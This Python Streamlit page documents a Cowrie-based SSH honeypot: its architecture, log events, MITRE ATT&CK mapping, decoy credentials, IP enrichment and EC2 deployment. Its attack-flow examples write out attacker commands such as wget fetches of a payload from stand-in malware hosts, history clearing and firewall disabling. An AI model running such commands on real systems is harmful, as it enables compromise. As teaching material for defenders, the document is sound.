"""
SSH Honeypot — Learning Center
Complete documentation: architecture, logs, MITRE ATT&CK, and how everything works.
"""

import os, sys
from pathlib import Path
import streamlit as st

_cur_dir = Path(__file__).resolve().parent
_root_dir = _cur_dir.parent if _cur_dir.name in ("src", "pages") else _cur_dir
if str(_root_dir) not in sys.path:
    sys.path.insert(0, str(_root_dir))

# ── Favicon ───────────────────────────────────────────────────────────────────
FAVICON_PATH = None
for candidate in [
    os.path.join(str(_root_dir), "assets", "bcss_logo.png"),
    "assets/bcss_logo.png", "/app/assets/bcss_logo.png"
]:
    if os.path.exists(candidate):
        FAVICON_PATH = candidate
        break
try:
    from PIL import Image
    _img = Image.open(FAVICON_PATH) if FAVICON_PATH and os.path.exists(FAVICON_PATH) else None
    if _img:
        _fav = _img.copy(); _fav.thumbnail((64,64))
        if _fav.mode == 'RGBA':
            _bg = Image.new('RGB', _fav.size, (5,5,7)); _bg.paste(_fav, mask=_fav.split()[3]); _fav = _bg
        _fi = _fav; _si = _img
    else: _fi = None; _si = None
except: _fi = None; _si = None

st.set_page_config(page_title="Learn · SOC", page_icon=_fi or ":book:", layout="wide", initial_sidebar_state="expanded")

# ── Theme ──────────────────────────────────────────────────────────────────────
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
:root { --bg:#050507; --surface:#0c0c10; --card:#111116; --border:#1a1a22; --text:#e4e4e7; --muted:#71717a; --accent:#06b6d4; --red:#ef4444; --green:#22c55e; --amber:#f59e0b; }
.stApp, .stApp header, [data-testid="stSidebar"] { background:var(--bg)!important; font-family:'Inter',sans-serif!important; }
.stMarkdown, .stMarkdown p, .stMarkdown li, .stMarkdown span, .stMarkdown h1, .stMarkdown h2, .stMarkdown h3, .stMarkdown h4, [data-testid="stSidebar"] .stMarkdown { color:var(--text)!important; }
[data-testid="stSidebar"] { border-right:1px solid var(--border)!important; background:#08080b!important; }
h1, .stMarkdown h1 { font-size:1.6rem!important; font-weight:800!important; letter-spacing:-.03em!important; margin-bottom:.5rem!important; }
h2, .stMarkdown h2 { font-size:1.15rem!important; font-weight:700!important; letter-spacing:-.02em!important; padding-bottom:.4rem; border-bottom:1px solid var(--border); margin-top:2rem!important; margin-bottom:1rem!important; }
h3, .stMarkdown h3 { font-size:.95rem!important; font-weight:700!important; margin-top:1.2rem!important; margin-bottom:.6rem!important; }
h4, .stMarkdown h4 { font-size:.85rem!important; font-weight:600!important; color:var(--accent)!important; margin-top:1rem!important; }
p, .stMarkdown p { font-size:.88rem!important; line-height:1.7!important; color:#a1a1aa!important; }
li, .stMarkdown li { font-size:.88rem!important; line-height:1.7!important; color:#a1a1aa!important; }
code, .stCode { font-family:'JetBrains Mono',monospace!important; font-size:.82rem!important; background:var(--surface)!important; border:1px solid var(--border)!important; border-radius:6px!important; }
.stCode>div { background:var(--surface)!important; }
hr { border-color:var(--border)!important; margin:1.5rem 0!important; }
details { border:1px solid var(--border)!important; border-radius:8px!important; background:var(--card)!important; }
.stTabs [data-baseweb="tab-list"] { gap:0!important; border-bottom:1px solid var(--border)!important; }
.stTabs [data-baseweb="tab"] { font-size:.82rem!important; font-weight:500!important; color:var(--muted)!important; }
.stTabs [aria-selected="true"] { color:var(--accent)!important; border-bottom-color:var(--accent)!important; }
.stAlert { border-radius:8px!important; }
.stDownloadButton button { border-radius:8px!important; font-weight:600!important; }

/* Custom components */
.arch-card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:20px; margin-bottom:12px; }
.arch-card h4 { color:var(--accent)!important; margin-top:0!important; font-size:.85rem!important; text-transform:uppercase; letter-spacing:.06em; }
.arch-card p { color:var(--text)!important; font-size:.82rem!important; margin-bottom:0; }

.log-card { background:var(--card); border:1px solid var(--border); border-left:3px solid var(--accent); border-radius:8px; padding:16px; margin-bottom:10px; }
.log-card .lt { font-size:.72rem; font-weight:600; text-transform:uppercase; letter-spacing:.08em; color:var(--accent); margin-bottom:6px; }
.log-card .ld { font-size:.82rem; color:var(--text); line-height:1.6; }
.log-card code { font-size:.78rem; background:var(--bg); padding:2px 6px; border-radius:4px; border:1px solid var(--border); }

.flow-step { display:flex; gap:16px; align-items:flex-start; margin-bottom:16px; }
.flow-num { min-width:32px; height:32px; border-radius:50%; background:var(--accent); color:#000; font-size:.82rem; font-weight:800; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
.flow-content { flex:1; }
.flow-content h4 { margin-top:2px!important; color:var(--text)!important; font-size:.88rem!important; }
.flow-content p { margin-bottom:0; color:var(--muted)!important; font-size:.82rem!important; }

.mitre-card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:14px; margin-bottom:8px; }
.mitre-card .mid { font-family:'JetBrains Mono',monospace; font-size:.78rem; color:var(--amber); font-weight:600; }
.mitre-card .mname { font-size:.85rem; font-weight:600; color:var(--text); margin:4px 0; }
.mitre-card .mdesc { font-size:.78rem; color:var(--muted); line-height:1.5; }

.tip-box { background:rgba(6,182,212,.06); border:1px solid rgba(6,182,212,.2); border-radius:8px; padding:14px; margin:12px 0; }
.tip-box .tip-title { font-size:.75rem; font-weight:700; color:var(--accent); text-transform:uppercase; letter-spacing:.06em; margin-bottom:6px; }
.tip-box p { color:var(--text)!important; font-size:.82rem!important; margin-bottom:0; }
</style>
""", unsafe_allow_html=True)


# ── Sidebar ───────────────────────────────────────────────────────────────────
if FAVICON_PATH and os.path.exists(FAVICON_PATH):
    st.sidebar.image(_si if _si else FAVICON_PATH, width=150)
st.sidebar.title("Learn")
st.sidebar.caption("Blue Cloud Softech Solutions")
st.sidebar.markdown("### Contents")
st.sidebar.markdown("""
- [How It Works](#how-it-works)
- [Architecture](#architecture)
- [Attack Flow](#attack-flow-step-by-step)
- [Log Types](#log-types-captured)
- [Log Storage](#where-logs-are-stored)
- [MITRE ATT&CK](#mitre-att-ck-mapping)
- [Honey Credentials](#honey-credentials)
- [Threat Intelligence](#threat-intelligence-pipeline)
- [Dashboard Guide](#dashboard-guide)
- [Deployment](#deployment-on-ec2)
- [Teardown](#teardown)
""")
st.sidebar.markdown("---")
st.sidebar.markdown("[Back to Dashboard](/)")
st.sidebar.markdown("[View Logs](/Logs)")


# ── Header ────────────────────────────────────────────────────────────────────
st.markdown("# SSH Honeypot Learning Center")
st.markdown("A complete guide to how this system works — from network trap to threat intelligence dashboard.")
st.divider()


# ── Section 1: How It Works ───────────────────────────────────────────────────
st.markdown("## How It Works")
st.markdown("An SSH honeypot is a decoy server that **pretends to be a real Linux machine**. Attackers connect to it, type commands, and try to break in — but everything they do is recorded. No real system is compromised.")

st.markdown("""
<div class="flow-step">
    <div class="flow-num">1</div>
    <div class="flow-content">
        <h4>Attacker Discovers Port 22</h4>
        <p>Botnets and scanners constantly sweep the internet for open SSH ports. Our honeypot listens on port 22, pretending to be a production server named <code>srv-prod-db01</code>.</p>
    </div>
</div>
<div class="flow-step">
    <div class="flow-num">2</div>
    <div class="flow-content">
        <h4>Cowrie Intercepts the Connection</h4>
        <p>Cowrie (the honeypot engine) accepts the SSH handshake, presents a fake SSH banner (<code>OpenSSH_8.9p1 Ubuntu</code>), and logs every detail: client version, ciphers, terminal size.</p>
    </div>
</div>
<div class="flow-step">
    <div class="flow-num">3</div>
    <div class="flow-content">
        <h4>Authentication Attempts</h4>
        <p>Attackers try username/password combinations from dictionaries. Our <code>userdb.txt</code> contains honey credentials — if an attacker tries <code>root:root</code>, they "succeed" and get a fake shell.</p>
    </div>
</div>
<div class="flow-step">
    <div class="flow-num">4</div>
    <div class="flow-content">
        <h4>Interactive Shell Capture</h4>
        <p>The attacker enters a fake bash shell. Every command they type (<code>whoami</code>, <code>uname -a</code>, <code>wget http://malware.com/payload</code>) is logged with timestamps and mapped to MITRE ATT&CK techniques.</p>
    </div>
</div>
<div class="flow-step">
    <div class="flow-num">5</div>
    <div class="flow-content">
        <h4>Enrichment & Analysis</h4>
        <p>Each attacker IP is automatically enriched with geolocation (country, city, ISP), AbuseIPDB reputation score, and VirusTotal malicious count. Results are cached for 24 hours.</p>
    </div>
</div>
<div class="flow-step">
    <div class="flow-num">6</div>
    <div class="flow-content">
        <h4>SOC Dashboard</h4>
        <p>All data flows into the Streamlit dashboard — real-time maps, credential analysis, MITRE TTP classification, session replay, and CSV export for reports.</p>
    </div>
</div>
""", unsafe_allow_html=True)

st.divider()


# ── Section 2: Architecture ───────────────────────────────────────────────────
st.markdown("## Architecture")

st.markdown("""
<div class="arch-card">
    <h4>Internet (Port 22)</h4>
    <p>Attackers / Botnets / Scanners connect to the public IP on port 22. They see what looks like a real Ubuntu server.</p>
</div>
<div style="text-align:center; color:var(--muted); font-size:1.5rem; margin:8px 0;">↓</div>
<div class="arch-card">
    <h4>Cowrie Honeypot (Docker Container)</h4>
    <p>Emulates a Linux shell. Records every keystroke, login attempt, file download, and TCP tunnel request. Writes structured JSON logs to <code>cowrie.json</code>.</p>
</div>
<div style="text-align:center; color:var(--muted); font-size:1.5rem; margin:8px 0;">↓</div>
<div class="arch-card">
    <h4>Ingestion Daemon (Python)</h4>
    <p>Tails <code>cowrie.json</code> in real-time. Parses each event, enriches IPs with GeoIP + AbuseIPDB + VirusTotal, maps commands to MITRE ATT&CK, and stores everything in SQLite.</p>
</div>
<div style="text-align:center; color:var(--muted); font-size:1.5rem; margin:8px 0;">↓</div>
<div class="arch-card">
    <h4>SQLite Database (honeypot.db)</h4>
    <p>6 tables: sessions, auth_attempts, commands, downloads, ip_cache, raw_logs. Indexed for fast queries. Stores IST timestamps, client fingerprints, and threat scores.</p>
</div>
<div style="text-align:center; color:var(--muted); font-size:1.5rem; margin:8px 0;">↓</div>
<div class="arch-card">
    <h4>Streamlit SOC Dashboard (Port 8501)</h4>
    <p>Interactive web UI with threat map, credential analysis, MITRE mapping, session inspector, event log, and CSV export.</p>
</div>
""", unsafe_allow_html=True)

st.divider()


# ── Section 3: Attack Flow ────────────────────────────────────────────────────
st.markdown("## Attack Flow: Step by Step")

st.markdown("Here's what happens when a real botnet hits our honeypot:")

steps = [
    ("TCP Connection", "Bot connects from 103.174.102.29:48291 to our port 22. Cowrie logs `cowrie.session.connect` with source IP, port, and timestamp."),
    ("SSH Handshake", "Client sends SSH version: `SSH-2.0-Go`. Cowrie responds with `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4`. Key exchange negotiates ciphers. Logged as `cowrie.client.version` and `cowrie.client.kex`."),
    ("Brute Force", "Bot tries `root:123456` — FAILED. Tries `root:root` — FAILED. Tries `root:password` — FAILED. Each attempt logged as `cowrie.login.failed`."),
    ("Honey Credential Hit", "Bot tries `root:toor` — SUCCESS (this is in our `userdb.txt`). Logged as `cowrie.login.success`. Attacker now has a fake shell."),
    ("Reconnaissance", "Attacker types: `uname -a`, `whoami`, `cat /etc/passwd`, `ps aux`. Each command logged with MITRE mapping (T1082, T1033, T1083, T1057)."),
    ("Payload Download", "Attacker runs `wget http://malware.site/payload.sh`. Cowrie intercepts the download, saves the file, logs SHA256 hash. Mapped to T1105 (Ingress Tool Transfer)."),
    ("Session End", "Attacker disconnects. Cowrie logs `cowrie.session.closed` with duration. TTY recording saved for replay."),
]

for i, (title, desc) in enumerate(steps, 1):
    st.markdown(f"""
<div class="flow-step">
    <div class="flow-num">{i}</div>
    <div class="flow-content">
        <h4>{title}</h4>
        <p>{desc}</p>
    </div>
</div>
""", unsafe_allow_html=True)

st.divider()


# ── Section 4: Log Types ──────────────────────────────────────────────────────
st.markdown("## Log Types Captured")

st.markdown("Cowrie produces structured JSON events. Here are all the event types we capture:")

log_types = [
    ("cowrie.session.connect", "Inbound Connection Probe", "Source IP, source port, destination port. Fired when a new TCP connection arrives."),
    ("cowrie.client.version", "SSH Client Banner", "The attacker's SSH client version string (e.g., `SSH-2.0-Go`, `SSH-2.0-libssh2_1.10.0`). Useful for fingerprinting botnets."),
    ("cowrie.client.kex", "Key Exchange Negotiation", "Lists of key exchange algorithms, ciphers, and compression methods the client supports. Identifies toolkits."),
    ("cowrie.login.failed", "Brute-Force Auth Failed", "Username and password attempted. Captures the full dictionary attack in real-time."),
    ("cowrie.login.success", "Honeypot Breach (Auth Success)", "Username and password that matched our honey credentials. Indicates an attacker gained shell access."),
    ("cowrie.command.input", "Shell Command Execution", "Exact command typed by the attacker in the fake shell. Mapped to MITRE ATT&CK techniques."),
    ("cowrie.session.file_download", "Malware Download Attempt", "URL of the payload, SHA256 hash of the downloaded file. Captures droppers, cryptominers, and scripts."),
    ("cowrie.direct-tcpip.request", "TCP Tunnel / Proxy Request", "Attacker attempting to use the honeypot as a SOCKS proxy or port forward."),
    ("cowrie.session.closed", "Session Terminated", "Total session duration in seconds. Marks the end of an attacker's interaction."),
    ("cowrie.client.fingerprint", "SSH Key Fingerprint", "Public key fingerprint if key-based auth is attempted."),
    ("cowrie.client.size", "Terminal Resize", "Terminal dimensions (e.g., 80x24). Can indicate automated tools vs. human attackers."),
    ("cowrie.log.closed", "TTY Recording Saved", "Path to the TTY replay file. Contains every keystroke with timing for forensic replay."),
]

for event_id, name, desc in log_types:
    st.markdown(f"""
<div class="log-card">
    <div class="lt">{event_id}</div>
    <div class="ld"><strong>{name}</strong> — {desc}</div>
</div>
""", unsafe_allow_html=True)

st.divider()


# ── Section 5: Log Storage ────────────────────────────────────────────────────
st.markdown("## Where Logs Are Stored")

st.markdown("All data persists on disk and survives container restarts via Docker volumes.")

storage = [
    ("Cowrie JSON Log", "/opt/cowrie/cowrie-git/var/log/cowrie/cowrie.json", "Primary event stream. One JSON object per line. Tailed by the ingestion daemon in real-time."),
    ("TTY Recordings", "/opt/cowrie/cowrie-git/var/lib/cowrie/tty/*.log", "Binary replay files. Each file records every keystroke from one attacker session with microsecond timing. Replay with: `python bin/playlog <file>`"),
    ("Malware Downloads", "/opt/cowrie/cowrie-git/var/lib/cowrie/downloads/", "Files uploaded/downloaded by attackers. SHA256-named. Captured payloads for malware analysis."),
    ("SQLite Database", "/app/data/honeypot.db", "Analytical database with6 tables: sessions, auth_attempts, commands, downloads, ip_cache, raw_logs. Powers the dashboard."),
    ("Cowrie Config", "/opt/cowrie/cowrie-git/etc/cowrie.cfg", "Honeypot settings: hostname, SSH version string, timeouts, output plugins."),
    ("Honey Credentials", "/opt/cowrie/cowrie-git/etc/userdb.txt", "Fake usernames and passwords that attackers can 'crack'. Format: `username:x:password`."),
]

for name, path, desc in storage:
    st.markdown(f"""
<div class="log-card">
    <div class="lt">{name}</div>
    <div class="ld"><code>{path}</code><br><br>{desc}</div>
</div>
""", unsafe_allow_html=True)

st.divider()


# ── Section 6: MITRE ATT&CK ──────────────────────────────────────────────────
st.markdown("## MITRE ATT&CK Mapping")

st.markdown("Every captured command is automatically classified into the [MITRE ATT&CK](https://attack.mitre.org/) framework — a globally recognized knowledge base of adversary tactics and techniques.")

st.markdown("### Observed Techniques")

mitre_techniques = [
    ("T1110", "Brute Force", "Credential Access", "Attackers try thousands of username:password combinations from dictionaries. Our honeypot captures every attempt."),
    ("T1078", "Valid Accounts", "Initial Access", "When an attacker successfully authenticates with a honey credential (e.g., root:toor), they've used a 'valid account'."),
    ("T1082", "System Information Discovery", "Discovery", "Commands like `uname -a`, `cat /proc/cpuinfo`, `lscpu`. Attackers fingerprint the OS before deploying payloads."),
    ("T1033", "System Owner/User Discovery", "Discovery", "Commands like `whoami`, `id`. Attackers check what privileges they have."),
    ("T1057", "Process Discovery", "Discovery", "Commands like `ps aux`, `top`. Attackers look for security tools, other malware, or crypto miners already running."),
    ("T1083", "File and Directory Discovery", "Discovery", "Commands like `ls -la`, `cat /etc/passwd`, `find /`. Attackers explore the filesystem."),
    ("T1105", "Ingress Tool Transfer", "Command and Control", "Commands like `wget`, `curl -O`. Attackers download malware, scripts, or cryptominers to the compromised host."),
    ("T1496", "Resource Hijacking", "Impact", "Cryptominer payloads (xmrig, minerd). Attackers use compromised servers to mine cryptocurrency."),
    ("T1070.003", "Clear Command History", "Defense Evasion", "Commands like `history -c`, `unset HISTFILE`. Attackers try to cover their tracks."),
    ("T1562.001", "Disable or Modify Tools", "Defense Evasion", "Commands like `iptables -F`, `ufw disable`. Attackers disable firewalls and security tools."),
    ("T1053.003", "Scheduled Task/Cron", "Persistence", "Commands like `crontab -l`. Attackers set up persistence mechanisms."),
    ("T1059.004", "Unix Shell Execution", "Execution", "Direct shell invocations: `bash`, `sh`, `python -c`. Used to run downloaded payloads."),
]

cols = st.columns(2)
for i, (tid, name, tactic, desc) in enumerate(mitre_techniques):
    with cols[i % 2]:
        st.markdown(f"""
<div class="mitre-card">
    <div class="mid">{tid}</div>
    <div class="mname">{name}</div>
    <div class="mdesc"><strong>{tactic}</strong> — {desc}</div>
</div>
""", unsafe_allow_html=True)

st.divider()


# ── Section 7: Honey Credentials ──────────────────────────────────────────────
st.markdown("## Honey Credentials")

st.markdown("The `userdb.txt` file contains credentials that attackers can 'crack'. These are intentionally weak to attract brute-force bots.")

creds = [
    ("root", "root", "Most common. Every bot tries this first."),
    ("root", "toor", "Reverse of root. Common in penetration testing tools."),
    ("root", "123456", "Top password in every breach database."),
    ("root", "password", "Second most common password globally."),
    ("admin", "admin", "Default credentials for many IoT devices."),
    ("admin", "admin123", "Slightly stronger variant bots try."),
    ("ubuntu", "ubuntu", "Default Ubuntu credentials on cloud instances."),
    ("pi", "raspberry", "Default Raspberry Pi credentials."),
    ("cisco", "cisco", "Default Cisco device credentials."),
    ("oracle", "oracle", "Default Oracle database credentials."),
]

st.markdown("| Username | Password | Why it's included |")
st.markdown("|----------|----------|-------------------|")
for u, p, why in creds:
    st.markdown(f"| `{u}` | `{p}` | {why} |")

st.markdown("""
<div class="tip-box">
    <div class="tip-title">How it works</div>
    <p>When an attacker tries a credential that matches <code>userdb.txt</code>, Cowrie grants them a fake shell. This lets us capture their post-exploitation commands, malware downloads, and lateral movement attempts — the most valuable threat intelligence.</p>
</div>
""", unsafe_allow_html=True)

st.divider()


# ── Section 8: Threat Intelligence ────────────────────────────────────────────
st.markdown("## Threat Intelligence Pipeline")

st.markdown("Every attacker IP is automatically enriched with data from three sources:")

intel = [
    ("ip-api.com (GeoIP)", "Free tier, no API key needed", "Country, city, ISP, ASN, latitude/longitude. Used for the threat map and country statistics. Rate limit: 45 requests/minute."),
    ("AbuseIPDB", "API key required (free tier: 1000 checks/day)", "Abuse confidence score (0-100%), total reports, usage type (data center, residential, etc.), domain, last reported date."),
    ("VirusTotal", "API key required (free tier: 4 requests/minute)", "Malicious count (how many AV engines flag it), suspicious count, reputation score. Also supports SHA256 hash lookup for downloaded malware."),
]

for name, auth, desc in intel:
    st.markdown(f"""
<div class="log-card">
    <div class="lt">{name}</div>
    <div class="ld"><strong>Auth:</strong> {auth}<br><br>{desc}</div>
</div>
""", unsafe_allow_html=True)

st.markdown("""
<div class="tip-box">
    <div class="tip-title">Caching Strategy</div>
    <p>Results are cached in the <code>ip_cache</code> SQLite table for 24 hours. This protects API rate limits and ensures the dashboard loads fast even with thousands of unique attacker IPs.</p>
</div>
""", unsafe_allow_html=True)

st.divider()


# ── Section 9: Dashboard Guide ────────────────────────────────────────────────
st.markdown("## Dashboard Guide")

st.markdown("### KPI Metrics (Top Bar)")
st.markdown("""
- **Sessions**: Total inbound connections to the honeypot
- **Unique IPs**: Distinct attacker source IPs
- **Auth Trials**: Total login attempts (failed + succeeded)
- **Breached**: Times attackers got a fake shell (used honey credentials)
- **Commands**: Shell commands typed by attackers
- **Countries**: Distinct source countries
""")

st.markdown("### Session Inspector")
st.markdown("Cards show the most active attacker sessions, sorted by threat level. Click a session to see full details: IP, location, ISP, abuse score, client fingerprint, and all commands/auth events.")

st.markdown("### Global Threat Map")
st.markdown("Plotly world map with attacker geolocation. Red = high abuse score, green = low. Bubble size = number of sessions from that IP.")

st.markdown("### Authentication Analysis")
st.markdown("- **Usernames**: Top targeted usernames (root, admin, ubuntu…)")
st.markdown("- **Passwords**: Top attempted passwords from brute-force dictionaries")
st.markdown("- **Outcome**: Donut chart showing failed vs. succeeded auth ratio")

st.markdown("### MITRE ATT&CK")
st.markdown("Horizontal bar chart of observed techniques. Click any technique ID in the dropdown to filter all views to that technique.")

st.markdown("### Event Log")
st.markdown("Raw chronological feed of every Cowrie event. Filter by time range, event type, IP, or keyword search. Expand any event to see the full JSON payload.")

st.markdown("### Export")
st.markdown("Download CSV files for sessions, commands, and auth attempts. Use these for lab reports, threat intelligence sharing, or further analysis in Excel/Splunk.")

st.divider()


# ── Section 10: Deployment ────────────────────────────────────────────────────
st.markdown("## Deployment on EC2")

st.markdown("### Prerequisites")
st.markdown("- AWS EC2 instance (Ubuntu 22.04/24.04 LTS)")
st.markdown("- Security group: Port 22 open to 0.0.0.0/0 (for honeypot), Port 22222 restricted to your IP (admin SSH), Port 8501 restricted to your IP (dashboard)")
st.markdown("- SSH key pair (.pem file)")

st.markdown("### Steps")

deploy_steps = [
    ("Connect to EC2", "ssh -i key.pem ubuntu@<EC2-IP>"),
    ("Clone repository", "git clone https://github.com/venkatvellapalem/ssh-honeypot.git && cd ssh-honeypot"),
    ("Run host setup", "sudo bash scripts/setup_host.sh  (moves host SSH to port 22222, installs Docker, configures UFW)"),
    ("Deploy containers", "./deploy.sh  (builds and starts Cowrie + SOC Dashboard)"),
    ("Access dashboard", "http://<EC2-IP>:8501"),
    ("Verify trap", "ssh root@<EC2-IP>  (should connect to honeypot on port 22)"),
]

for i, (title, cmd) in enumerate(deploy_steps, 1):
    st.markdown(f"""
<div class="flow-step">
    <div class="flow-num">{i}</div>
    <div class="flow-content">
        <h4>{title}</h4>
        <p><code>{cmd}</code></p>
    </div>
</div>
""", unsafe_allow_html=True)

st.divider()


# ── Section 11: Teardown ──────────────────────────────────────────────────────
st.markdown("## Teardown")

st.markdown("To stop the honeypot and avoid AWS charges:")

st.code("""
# Stop containers
docker compose down

# Stop EC2 instance (preserves data)
aws ec2 stop-instances --instance-ids <id>

# Terminate EC2 instance (deletes everything)
aws ec2 terminate-instances --instance-ids <id>
""", language="bash")

st.divider()

st.markdown("""
<div class="tip-box">
    <div class="tip-title">Security Note</div>
    <p>This honeypot is designed for <strong>defensive security training</strong> only. Never deploy it on a production network without proper isolation. The honeypot captures real attacker traffic — handle the data responsibly and in compliance with your organization's policies.</p>
</div>
""", unsafe_allow_html=True)

st.caption("BCSSL Learning Center  ·  Blue Cloud Softech Solutions Ltd.")
